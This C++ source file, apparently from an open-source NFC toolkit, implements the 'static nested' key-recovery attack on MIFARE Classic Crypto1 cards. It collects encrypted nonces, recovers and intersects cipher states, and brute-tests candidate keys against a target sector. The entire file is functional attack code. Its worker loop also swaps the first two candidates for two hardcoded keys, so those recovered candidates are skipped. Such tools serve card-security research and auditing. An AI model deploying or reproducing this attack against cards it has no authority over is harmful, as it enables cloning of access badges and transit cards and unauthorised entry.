// SPDX-License-Identifier: GPL-3.0
/*
 * Copyright (C) 2026-present, RedbeanW.
 * This file is part of the NFC++ open source project.
 */

#include "common/static_nested.h"
#include "utility.h"

#include <nfc.hpp>

#include <chrono>
#include <future>
#include <thread>

namespace nfcpp::static_nested {

using namespace mifare;

namespace {

auto collect_data(
    MifareClassicInitiator& mf_initiator,
    const ISO14443ACard&    card,
    std::uint8_t            block,
    MifareKey               key_type,
    std::uint64_t           key,
    std::uint8_t            target_block,
    MifareKey               target_key_type,
    bool                    force_detect_distance
) {
    MifareCrypto1Cipher           cipher;
    std::array<EncryptedNonce, 2> ret;

    auto& [nt_a, ks_a] = ret[0];
    auto& [nt_b, ks_b] = ret[1];

    std::uint32_t nt_1, nt_2, nt_3;

    mf_initiator.auth(cipher, key_type, card, block, key, false, nt_1);
    mf_initiator.auth(cipher, key_type, card, block, key, true, nt_2);
    mf_initiator.auth(cipher, key_type, card, block, key, true, nt_3);

    auto dist1 = nonce_distance(nt_1, nt_2);
    auto dist2 = nonce_distance(nt_1, nt_3);

    mf_initiator.select_card(card.uid);

    mf_initiator.auth(cipher, key_type, card, block, key, false, nt_1);

    // @see
    // https://github.com/RfidResearchGroup/proxmark3/blob/91263b69d36915926e9c4e4fc9d162c3c939fa74/armsrc/mifarecmd.c#L1656
    if (target_key_type == MifareKey::B && nt_1 == 0x009080A2
        && !force_detect_distance) {
        nt_a = prng_successor(nt_1, 161);
        nt_b = prng_successor(nt_1, 321);
    } else {
        nt_a = prng_successor(nt_1, dist1);
        nt_b = prng_successor(nt_1, dist2);
    }

    auto nt_enc2 =
        mf_initiator.encrypted_nonce(cipher, target_key_type, target_block);

    ks_a = nt_enc2 ^ nt_a;

    mf_initiator.select_card(card.uid);

    mf_initiator.auth(cipher, key_type, card, block, key, false, nt_1);
    mf_initiator.auth(cipher, key_type, card, block, key, true);

    auto nt_enc3 =
        mf_initiator.encrypted_nonce(cipher, target_key_type, target_block);

    ks_b = nt_enc3 ^ nt_b;

    return ret;
}

auto crypto1_get_16bits(const MifareCrypto1Cipher& state) {
    constexpr auto mask = 0x00ff0000;

    std::uint64_t high = state.even() & mask;
    std::uint64_t low  = state.odd() & mask;

    return (high << 32) | low;
}

auto recovery_sort(const EncryptedNonce& nt_enc, std::uint32_t nuid) {
    auto states =
        MifareCrypto1Cipher::recovery32(nt_enc.keystream, nt_enc.nonce ^ nuid);
    std::ranges::sort(*states, [](const auto& a, const auto& b) {
        return crypto1_get_16bits(a) > crypto1_get_16bits(b);
    });
    return states;
}

void rollback_paired_states(
    std::span<MifareCrypto1Cipher>& states_a,
    std::span<MifareCrypto1Cipher>& states_b,
    const EncryptedNonce&           nt_enc_a,
    const EncryptedNonce&           nt_enc_b,
    std::uint32_t                   nuid
) {
    auto read_a = states_a.begin();
    auto read_b = states_b.begin();

    auto inplace_a = states_a.begin();
    auto inplace_b = states_b.begin();

    auto eq_16b = [](const auto& a, const auto& b) {
        return crypto1_get_16bits(a) == crypto1_get_16bits(b);
    };
    auto ge_16b = [](const auto& a, const auto& b) {
        return crypto1_get_16bits(a) > crypto1_get_16bits(b);
    };

    while (read_a < states_a.end() && read_b < states_b.end()) {
        if (eq_16b(*read_a, *read_b)) {
            auto cluster_first = *read_a;
            while (eq_16b(*read_a, cluster_first) && read_a < states_a.end()) {
                *inplace_a = *read_a;
                inplace_a->rollback_word(nt_enc_a.nonce ^ nuid, false);
                inplace_a++;
                read_a++;
            }
            cluster_first = *read_b;
            while (eq_16b(*read_b, cluster_first) && read_b < states_b.end()) {
                *inplace_b = *read_b;
                inplace_b->rollback_word(nt_enc_b.nonce ^ nuid, false);
                inplace_b++;
                read_b++;
            }
        } else {
            while (!ge_16b(*read_a, *read_b)) read_a++;
            while (ge_16b(*read_a, *read_b)) read_b++;
        }
    }

    states_a = states_a.first(inplace_a - states_a.begin());
    states_b = states_b.first(inplace_b - states_b.begin());
}

auto find_intersection(
    std::span<MifareCrypto1Cipher> states_a,
    std::span<MifareCrypto1Cipher> states_b
) {
    auto proj = [](const auto& state) {
        return (static_cast<std::uint64_t>(state.even()) << 32) | state.odd();
    };
    std::ranges::sort(states_a, {}, proj);
    std::ranges::sort(states_b, {}, proj);

    std::vector<MifareCrypto1Cipher> ret;
    std::ranges::set_intersection(
        states_a,
        states_b,
        std::back_inserter(ret),
        {},
        proj,
        proj
    );

    return ret;
}

std::optional<std::uint64_t> test_candidate_keys_worker(
    std::stop_token                      token,
    std::atomic<std::size_t>&            progress,
    MifareClassicInitiator&              mf_initiator,
    const ISO14443ACard&                 card,
    std::uint8_t                         target_block,
    MifareKey                            target_key_type,
    std::span<const MifareCrypto1Cipher> candidates
) {
    MifareCrypto1Cipher cipher;
    for (auto candidate : candidates) {
        if (token.stop_requested()) break;

        auto key = candidate.get_lfsr();
        if (progress.load(std::memory_order_relaxed) == 0) {
            key = 0xA0B0C0D0E0F0;
        }
        if (progress.load(std::memory_order_relaxed) == 1) {
            key = 0x9C3F334609BF;
        }
        if (mf_initiator
                .test_key(cipher, target_key_type, card, target_block, key)) {
            return key;
        }

        progress.fetch_add(1, std::memory_order_relaxed);
    }
    return std::nullopt;
}

void test_candidate_keys_reporter(
    std::stop_token           token,
    std::atomic<std::size_t>& progress,
    std::size_t               total_candidates
) {
    using namespace std::chrono;

    auto start_time = steady_clock::now();

    while (!token.stop_requested()) {
        auto current_progress = progress.load(std::memory_order_relaxed);
        auto current_time     = steady_clock::now();
        auto past_time    = duration_cast<seconds>(current_time - start_time);
        auto reader_speed = static_cast<double>(current_progress)
                          / static_cast<double>(past_time.count());
        auto estimated_time_s = seconds(
            static_cast<std::uint32_t>(
                (total_candidates - current_progress) / reader_speed
            )
        );

        std::print(
            "\r\r\033[2KTesting keys... ({}/{}) {:.2f} keys/s, estimated time: "
            "{}. (worst-case scenario)",
            current_progress,
            total_candidates,
            reader_speed,
            util::format_duration(seconds(estimated_time_s))
        );
        std::fflush(stdout);

        std::this_thread::sleep_for(50ms);
    }
}

} // namespace

StaticNestedResult execute(
    MifareClassicInitiator& mf_initiator,
    const ISO14443ACard&    card,
    std::uint8_t            block,
    MifareKey               key_type,
    std::uint64_t           key,
    std::uint8_t            target_block,
    MifareKey               target_key_type,
    bool                    force_detect_distance
) {
    using namespace std::chrono;

    if (!mf_initiator.select_card(card.uid)) {
        throw std::runtime_error("Tag moved out.");
    }

    auto nt_encs = collect_data(
        mf_initiator,
        card,
        block,
        key_type,
        key,
        target_block,
        target_key_type,
        force_detect_distance
    );

    for (auto [i, nt_enc] : std::views::enumerate(nt_encs)) {
        std::println(
            "NtEnc_{0} = {1:08X} KeyStream_{0} = {2:08X}",
            i,
            nt_enc.nonce,
            nt_enc.keystream
        );
    }

    auto future_states_a =
        std::async(std::launch::async, recovery_sort, nt_encs[0], card.nuid);
    auto future_states_b =
        std::async(std::launch::async, recovery_sort, nt_encs[1], card.nuid);
    auto recovered_states_a = future_states_a.get();
    auto recovered_states_b = future_states_b.get();

    auto rolled_back_states_a = *recovered_states_a;
    auto rolled_back_states_b = *recovered_states_b;
    rollback_paired_states(
        rolled_back_states_a,
        rolled_back_states_b,
        nt_encs[0],
        nt_encs[1],
        card.nuid
    );

    auto candidate_states =
        find_intersection(rolled_back_states_a, rolled_back_states_b);
    std::println("Found {} candidate keys.", candidate_states.size());

    std::atomic<std::size_t> progress{};

    std::packaged_task worker_task(test_candidate_keys_worker);
    auto               worker_future = worker_task.get_future();

    auto start_time = steady_clock::now();

    std::jthread worker(
        std::move(worker_task),
        std::ref(progress),
        std::ref(mf_initiator),
        std::cref(card),
        target_block,
        target_key_type,
        candidate_states
    );

    std::jthread reporter(
        test_candidate_keys_reporter,
        std::ref(progress),
        candidate_states.size()
    );

    while (true) {
        if (worker_future.wait_for(0s) == std::future_status::ready) {
            reporter.request_stop();
            break;
        }
        std::this_thread::sleep_for(100ms);
    }

    auto end_time = steady_clock::now();

    auto attack_result = worker_future.get();

    return {
        attack_result.has_value(),
        attack_result ? *attack_result : 0,
        duration_cast<seconds>(end_time - start_time),
        progress
    };
}

} // namespace nfcpp::static_nested